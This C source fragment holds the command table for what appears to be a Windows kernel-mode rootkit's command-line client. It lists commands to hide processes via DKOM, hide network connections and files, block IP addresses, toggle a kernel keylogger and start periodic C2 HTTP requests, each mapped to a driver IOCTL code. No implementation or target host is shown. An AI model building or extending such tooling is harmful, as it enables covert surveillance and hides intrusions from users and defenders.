// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------
// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------



#include "../Structures/Structures00Techniques.h"
#include "../Globals/Globals00IOCTLs.h"



// START -> GLOBALS ---------------------------------------------------------------------------------------------------------------------------
// START -> GLOBALS ---------------------------------------------------------------------------------------------------------------------------



/**
	@brief      Array of all supported CLI commands.
**/
static const STRUCTURES_TECHNIQUES_COMMAND_ENTRY Globals_Techniques_Commands[] = {
	//  General
	{ "kstatus",                           "Check if the kernel-mode driver is currently active",                   "kstatus",                               0,                                                        FALSE,    STRUCTURES_TECHNIQUES_CMD_CAT_GENERAL },
	{ "khello",                            "Send a hello request to the driver",                                    "khello",                                GLOBALS_IOCTLS_COMMAND_GENERAL_HELLO,                     FALSE,    STRUCTURES_TECHNIQUES_CMD_CAT_GENERAL },
	// Direct Kernel Object Modification
	{ "khideprocess",                      "Hide a process from task managers using its PID",                       "khideprocess 1234",                     GLOBALS_IOCTLS_COMMAND_DKOM_HIDE_PROCESS,                 TRUE,     STRUCTURES_TECHNIQUES_CMD_CAT_DKOM },
	{ "klisthiddenprocesses",              "Display all processes currently hidden via DKOM",                       "klisthiddenprocesses",                  GLOBALS_IOCTLS_COMMAND_DKOM_LIST_HIDDEN_PROCESSES,        FALSE,    STRUCTURES_TECHNIQUES_CMD_CAT_DKOM },
	{ "kunhideprocess",                    "Unhide a process using its index in the list",                          "kunhideprocess 0",                      GLOBALS_IOCTLS_COMMAND_DKOM_UNHIDE_PROCESS,               TRUE,     STRUCTURES_TECHNIQUES_CMD_CAT_DKOM },
	// Keyboard Filter
	{ "kkeyloggeron",                      "Activate the kernel-mode keylogger to monitor keystrokes",              "kkeyloggeron",                          GLOBALS_IOCTLS_COMMAND_KEYBOARD_ENABLE_KEYLOGGER,         FALSE,    STRUCTURES_TECHNIQUES_CMD_CAT_KEYBOARD },
	{ "kkeyloggeroff",                     "Deactivate the kernel-mode keylogger",                                  "kkeyloggeroff",                         GLOBALS_IOCTLS_COMMAND_KEYBOARD_DISABLE_KEYLOGGER,        FALSE,    STRUCTURES_TECHNIQUES_CMD_CAT_KEYBOARD },
	// Network Store Interface
    { "khideconnections",                  "Hide all TCP connections that match a specific port",                   "khideconnections 8080",                 GLOBALS_IOCTLS_COMMAND_NSI_HIDE_CONNECTIONS,              TRUE,     STRUCTURES_TECHNIQUES_CMD_CAT_NSI },
    { "klisthiddenconnections",            "List all TCP ports currently used to hide network connections",         "klisthiddenconnections",                GLOBALS_IOCTLS_COMMAND_NSI_LIST_HIDDEN_CONNECTIONS,       FALSE,    STRUCTURES_TECHNIQUES_CMD_CAT_NSI },
    { "kunhideconnections",                "Unhide connections using its index in the hidden list",                 "kunhideconnections 0",                  GLOBALS_IOCTLS_COMMAND_NSI_UNHIDE_CONNECTIONS,            TRUE,     STRUCTURES_TECHNIQUES_CMD_CAT_NSI },
	// Windows Filtering Platform
	{ "kblockconnection",                  "Block outgoing connections to a specified IPv4 address",                "kblockconnection 8.8.8.8",              GLOBALS_IOCTLS_COMMAND_WFP_BLOCK_CONNECTION,              TRUE,     STRUCTURES_TECHNIQUES_CMD_CAT_WFP },
	{ "klistblockedconnections",           "List all IPv4 addresses currently blocked",                             "klistblockedconnections",               GLOBALS_IOCTLS_COMMAND_WFP_LIST_BLOCKED_CONNECTIONS,      FALSE,    STRUCTURES_TECHNIQUES_CMD_CAT_WFP },
	{ "kunblockconnection",                "Unblock an IP address using its index in the list",                     "kunblockconnection 0",                  GLOBALS_IOCTLS_COMMAND_WFP_UNBLOCK_CONNECTION,            TRUE,     STRUCTURES_TECHNIQUES_CMD_CAT_WFP },
	// WinSock Kernel
	{ "kenablec2",                         "Start periodic C2 HTTP requests from kernel mode",                      "kenablec2",                             GLOBALS_IOCTLS_COMMAND_WSK_ENABLE_C2,                     FALSE,    STRUCTURES_TECHNIQUES_CMD_CAT_WSK },
	{ "kdisablec2",                        "Stop periodic C2 HTTP requests from kernel mode",                       "kdisablec2",                            GLOBALS_IOCTLS_COMMAND_WSK_DISABLE_C2,                    FALSE,    STRUCTURES_TECHNIQUES_CMD_CAT_WSK },
	// MiniFilter
	{ "khidefile",                         "Hide a file or folder from user-mode access by path",                   "khidefile C:\\secret.txt",              GLOBALS_IOCTLS_COMMAND_MINI_HIDE_FILE,                    TRUE,     STRUCTURES_TECHNIQUES_CMD_CAT_MINIFILTER },
	{ "klisthiddenfiles",                  "Display all files and folders currently hidden by the minifilter",      "klisthiddenfiles",                      GLOBALS_IOCTLS_COMMAND_MINI_LIST_HIDDEN_FILES,            FALSE,    STRUCTURES_TECHNIQUES_CMD_CAT_MINIFILTER },
	{ "kunhidefile",                       "Unhide a file using its index in the list",                             "kunhidefile 0",                         GLOBALS_IOCTLS_COMMAND_MINI_UNHIDE_FILE,                  TRUE,     STRUCTURES_TECHNIQUES_CMD_CAT_MINIFILTER },
};



/**
	@brief      Array of human-readable category names corresponding to each techniques category enum value.
**/
static const char* Globals_Techniques_CategoryNames[STRUCTURES_TECHNIQUES_CMD_CAT_TOTAL] = {
	"General",
	"Direct Kernel Object Manipulation (DKOM)",
	"Keyboard Filter",
	"Network Store Interface (NSI)",
	"Windows Filtering Platform (WFP)",
	"WinSock Kernel (WSK)",
	"MiniFilter",
};



/**
	@brief      Array of lowercase keywords used to refer to each category from the CLI.
**/
static const char* Globals_Techniques_CategoryKeys[STRUCTURES_TECHNIQUES_CMD_CAT_TOTAL] = {
	"gen", "dkom","key", "nsi", "wfp", "wsk", "mini",
};



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
